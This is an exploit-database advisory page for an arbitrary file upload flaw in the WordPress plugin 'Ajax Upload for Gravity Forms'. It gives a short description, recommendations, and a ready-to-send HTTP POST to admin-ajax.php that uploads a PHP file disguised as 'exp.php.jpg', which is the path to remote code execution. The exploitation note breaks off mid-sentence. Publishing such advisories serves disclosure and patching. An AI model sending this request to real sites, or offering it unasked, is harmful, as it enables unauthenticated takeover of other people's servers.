---
title: WordPress Plugin Ajax Upload for Gravity Forms - Arbitrary File Upload
url: https://cxsecurity.com/issue/WLB-2026020017
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-02-15
fetch_date: 2026-02-16T04:18:13.979500
---

# WordPress Plugin Ajax Upload for Gravity Forms - Arbitrary File Upload

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **WordPress Plugin Ajax Upload for Gravity Forms - Arbitrary File Upload**  **2026.02.15**  Credit:  **[UnM@SK](https://cxsecurity.com/author/UnM%40SK/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2014-4972](https://cxsecurity.com/cveshow/CVE-2014-4972/ "Click to see CVE-2014-4972")**  CWE: **[CWE-434](https://cxsecurity.com/cwe/CWE-434 "Click to see CWE-434")**  CVSS Base Score: **7.5/10**  Impact Subscore: **6.4/10**  Exploitability Subscore: **10/10**  Exploit range: **Remote**  Attack complexity: **Low**  Authentication: **No required**  Confidentiality impact: **Partial**  Integrity impact: **Partial**  Availability impact: **Partial** | |

################################################################################
# Exploit Title: WordPress Plugin Ajax Upload for Gravity Forms - Arbitrary File Upload (ZIP)
# Date: 2026-02-05
# Exploit Author: UnM@SK
# Vendor Homepage: https://github.com/WPPlugins/ajax-upload-for-gravity-forms
# Category: Webapps
# Vulnerability Type: [CWE-434] Unrestricted Upload of File with Dangerous Type
################################################################################
[+] Description:
The "Ajax Upload for Gravity Forms" plugin for WordPress fails to validate
file extensions properly in its AJAX handler. This allow unauthenticated
attackers to upload arbitrary files, including .zip files containing
malicious scripts. This can lead to Remote Code Execution (RCE) and full
server compromise.
[+] Proof of Concept (PoC):
POST /wp-admin/admin-ajax.php?action=itsg\_ajaxupload\_upload\_file HTTP/2
Host: [TARGET\_HOST]
Content-Type: multipart/form-data; boundary=---------------------------18990914928282
-----------------------------18990914928282
Content-Disposition: form-data; name="files[]"; filename="exp.php.jpg"
Content-Type: image/jpeg
<?php phpinfo();?>
-----------------------------18990914928282--
[+] Exploitation Note:
The application accepts the file because it only checks the initial
magic bytes or ignores the extension check entirely when sent via
the 'itsg\_ajaxupload\_upload\_file' action. Attackers can bundle a
[+] Impact:
- Arbitrary File Upload.
[+] Recommendations:
- Disable the plugin if not in use.
- Sanitize the 'files[]' array on the server side to only allow specific
image extensions.
- Use 'wp\_handle\_upload()' or similar WordPress core functions that
provide built-in security checks.
################################################################################

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026020017)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top